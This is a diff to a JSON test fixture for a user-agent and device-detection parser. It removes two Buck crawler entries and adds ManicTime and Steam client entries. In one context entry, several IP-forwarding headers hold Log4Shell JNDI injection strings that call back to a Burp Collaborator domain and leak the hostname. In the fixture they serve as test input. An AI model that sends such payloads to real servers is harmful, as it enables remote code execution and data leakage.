@@ -1337,49 +1337,6 @@
   },
   {
     "headers": {
-      "dnt": "1",
-      "user-agent": "Buck/2.3; (+https://app.hypefactors.com/media-monitoring/about.html)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "Buck/2.3; (+https://app.hypefactors.com/media-monitoring/about.html)"
     },
     "device": {
@@ -2978,49 +2935,6 @@
   },
   {
     "headers": {
-      "dnt": "1",
-      "user-agent": "Buck/2.3.1; (+https://app.hypefactors.com/media-monitoring/about.html)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "Scribbr-Citation-Bot",
       "content-type": "text/html; charset=utf-8"
     },
@@ -4259,6 +4173,94 @@
       "x-originating-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionatingIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
       "x-original-remote-addr": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrionalRemoteIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
       "x-real-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xRealIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "ManicTime/4.7.5.1",
+      "x-p2p-peerdist": "Version=1.1",
+      "x-p2p-peerdistex": "MinContentInformation=1.0, MaxContentInformation=2.0"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "accept-charset": "ISO-8859-1, utf-8, *;q=0.7",
+      "range": "bytes=0-50000",
+      "user-agent": "Valve/Steam HTTP Client 1.0"
     },
     "device": {
       "architecture": null,
